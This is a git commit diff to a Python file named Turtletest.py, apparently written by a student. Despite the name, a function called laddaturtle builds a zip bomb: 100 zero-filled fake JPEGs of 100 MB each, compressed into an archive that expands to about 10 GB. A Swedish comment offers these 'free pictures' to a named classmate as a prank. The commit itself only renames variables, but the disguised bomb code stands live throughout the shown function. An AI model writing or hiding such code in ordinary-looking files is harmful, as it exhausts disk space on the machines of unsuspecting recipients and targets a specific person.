92f562a2cd4fcd9f167263b2889c19cfdc68be83
jag <vilgot.sundin@skola.taby.se>
2026-05-08 11:56:36 +0200

    Hajlojs

--- Turtletest.py
+++ Turtletest.py
@@ -64,13 +64,13 @@ def laddaturtle():
     OUTPUT_ZIP = "pictures_10gb.zip"
     # Read Me !!!!
 
-    # Du får gratis 10 gb av bilder😊😊 varsogod Johannes!!!(Bli inte sur om det funkar, du borde förväntat dig sånt här...)
+    # Du får gratis 10 gb av bilder😊😊 varsogod Johannes!!!(Bli inte sur om det funkar, du borde förväntat dig sånt här tidigare...)
 
     # Read Me !!!!
 
-    NUM_FILES = 100
-    FILE_SIZE_BYTES = 100 * 1024 * 1024  # 100 MB per file
-    TOTAL_GB = (NUM_FILES * FILE_SIZE_BYTES) / (1024 ** 3)
+    Antalfil = 100
+    Filstorlek = 100 * 1024 * 1024 
+    TOTAL_GB = (Antalfil * Filstorlek) / (1024 ** 3)
     
     JPEG_HEADER = bytes([
         0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,
@@ -79,12 +79,12 @@ def laddaturtle():
     ])
     JPEG_FOOTER = bytes([0xFF, 0xD9])
     
-    FILLER = b"\x00" * (FILE_SIZE_BYTES - len(JPEG_HEADER) - len(JPEG_FOOTER))
+    FILLER = b"\x00" * (Filstorlek - len(JPEG_HEADER) - len(JPEG_FOOTER))
     FAKE_JPEG = JPEG_HEADER + FILLER + JPEG_FOOTER
     
 
     with zipfile.ZipFile(OUTPUT_ZIP, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
-        for i in range(1, NUM_FILES + 1):
+        for i in range(1, Antalfil + 1):
             filename = f"pictures/photo_{i:04d}.jpg"
             zf.writestr(filename, FAKE_JPEG)
     
